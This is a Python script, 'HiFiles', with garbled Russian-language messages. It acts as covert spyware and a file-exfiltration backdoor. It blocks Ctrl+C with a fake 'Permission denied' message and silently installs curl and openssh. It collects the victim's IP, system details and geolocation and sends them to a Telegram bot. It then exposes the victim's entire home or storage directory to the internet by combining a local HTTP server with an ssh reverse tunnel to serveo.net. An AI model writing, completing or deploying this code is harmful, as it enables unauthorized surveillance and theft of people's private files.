import time
import subprocess
import requests
import os
import threading
import sys
import signal
import random
import platform
import json
import re

TELEGRAM_BOT_TOKEN = ''
TELEGRAM_CHAT_ID = ''
begin = ''

class HiFiles:
    def __init__(self):
        self.os_name = platform.system()
        self.sys_name = 'undefined'
        self.emoji = ''
        self.ssh_output = []
        self.path = ''

        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, sig, frame):
        print("Unable to kill process. Permission denied.")

    def send_telegram_message(self, message):
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message
        }
        requests.post(url, data=payload)

    def get_geolocation(self):
        try:
            result = subprocess.run(['curl', 'https://ipinfo.io/json'], capture_output=True, text=True)
            if result.returncode == 0:
                return json.loads(result.stdout)
            else:
                self.send_telegram_message("üåê‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ curl.")
                return None
        except Exception as e:
            self.send_telegram_message(f"üåê‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –≥–µ–æ: {e}")
            return None

    def get_location_by_ip(self, ip):
        response = requests.get(f'https://ipinfo.io/{ip}/json')
        if response.status_code == 200:
            return response.json()
        else:
            self.send_telegram_message("‚õìÔ∏è‚Äçüí• –û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –∑–∞–ø—Ä–æ—Å–∞ –∫ ipinfo.io")
            return None
            
    def session(self):
        global ssh, ssh_output
        global path
        process1 = subprocess.Popen(['python', '-m', 'http.server', '8080', '-d', f'{self.path}'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        process2 = subprocess.Popen(['ssh', '-R', '80:localhost:8080', 'serveo.net'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        threading.Thread(target=self.send_output, args=(process1,)).start()
        while True:
            line = process2.stdout.readline()
            if not line:
                break
            self.ssh_output.append(line.decode('utf-8').strip())

    def send_output(self, process):
        if self.ssh_output:  # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å—Ç—å –ª–∏ –¥–∞–Ω–Ω—ã–µ
            ssh_output_str = '\n'.join(self.ssh_output)  # –û–±—ä–µ–¥–∏–Ω—è–µ–º –≤—Å–µ —Å—Ç—Ä–æ–∫–∏
            # –£–¥–∞–ª—è–µ–º —É–ø—Ä–∞–≤–ª—è—é—â–∏–µ –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ—Å—Ç–∏ ANSI
            ssh_output_str = re.sub(r'\x1B\[[0-?9;]*[mK]', '', ssh_output_str)
            self.send_telegram_message(f"üõú –°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ:\n{ssh_output_str}")
            self.ssh_output.clear()  # –û—á–∏—â–∞–µ–º —Å–ø–∏—Å–æ–∫ –ø–æ—Å–ª–µ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è
        else:
            self.send_telegram_message("üõú –û–∂–∏–¥–∞–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö...")
            time.sleep(5)
            self.send_output(process)
    
    def run_commands(self):
        global begin
        print(begin)
        try:
            if self.os_name == "Linux":
                if os.path.exists('/data/data/com.termux/files'):
                    self.sys_name = "Termux (Android)"
                    self.emoji = 'üì±'
                    subprocess.run(['pkg', 'install', 'curl', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(['pkg', 'install', 'openssh', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    self.path = '/storage/emulated/0'
                else:
                    self.sys_name = "Linux Debian-based"
                    self.emoji = 'üêß'
                    subprocess.run(['sudo', 'apt', 'install', 'curl', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(['sudo', 'apt', 'install', 'openssh', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    self.path = '/home'
            elif self.os_name == "Darwin":
                self.sys_name = "MacOS"
                self.emoji = 'üçè'
                subprocess.run(['brew', 'install', 'curl'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['brew', 'install', 'openssh'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.path = '/Users'
            elif self.os_name == "Windows":
                self.sys_name = "Windows"
                self.emoji = 'üíª'
                subprocess.run(['winget', 'install', 'curl', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['winget', 'install', 'openssh', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['choco', 'install', 'curl', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['choco', 'install', 'openssh', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.path = r'C:'
            else:
                self.send_telegram_message(f"‚ö†Ô∏è –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –û–°! : {self.os_name}")
                self.emoji = '‚ö†Ô∏è'
                self.sys_name = "–ù–µ–æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–∞—è –û–°"
        except Exception as e:
            self.send_telegram_message(f"‚ùå –û—à–∏–±–∫–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π, –ø—Ä–æ–¥–æ–ª–∂–∞—é —Ä–∞–±–æ—Ç—É: {e}")
            print(f"–û—à–∏–±–∫–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π: {e}")
        try:
            result = subprocess.run(['curl', 'ifconfig.me'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.returncode == 0:
                ip_address = result.stdout.strip()
            else:
                ip_address = 'üö´'
            ver = platform.version()
            arch = platform.architecture()
            geo_data = self.get_geolocation()
            if geo_data:
                latitude, longitude = geo_data['loc'].split(',')
                location_info = self.get_location_by_ip(ip_address)
                location_message = (
                    f"üåç –ì–µ–æ\n"
                    f"–®–∏—Ä–æ—Ç–∞: {latitude}\n"
                    f"–î–æ–ª–≥–æ—Ç–∞: {longitude}\n"
                )
                if location_info:
                    location_message += (
                        f"–ì–æ—Ä–æ–¥: {location_info.get('city', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}\n"
                        f"–†–µ–≥–∏–æ–Ω: {location_info.get('region', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}\n"
                        f"–°—Ç—Ä–∞–Ω–∞: {location_info.get('country', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}\n"
                        f"–ü–æ—á—Ç–æ–≤—ã–π –∏–Ω–¥–µ–∫—Å: {location_info.get('postal', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}\n"
                    )
                else:
                    location_message += "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–æ–ø –∏–Ω—Ñ—É."
            else:
                location_message = "üåê‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –≥–µ–æ."
            self.send_telegram_message(f"{self.emoji} –ù–æ–≤–∞—è —Å–µ—Å—Å–∏—è\n–ö–ª–∏–µ–Ω—Ç/IP: {ip_address}\n–°–∏—Å—Ç–µ–º–∞: {self.sys_name} {ver} {arch}\n {location_message}")
        except Exception as e:
            self.send_telegram_message(f"üö´ Fatal: {e}")
        if self.os_name == "Windows":
            os.system('cls')  # –î–ª—è Windows
        elif self.os_name in ["Linux", "Darwin"]:  # Linux –∏ macOS
            os.system('clear')  # –î–ª—è Linux –∏ macOS
        else:
            self.send_telegram_message(f"üö´ Fatal. Unsupported platform.")
            pass
        ssh_thread = threading.Thread(target=self.session)
        ssh_thread.start()

    def hifiles(self):
        self.run_commands()

if __name__ == "__main__":
    hifiles_instance = HiFiles()
    hifiles_instance.hifiles()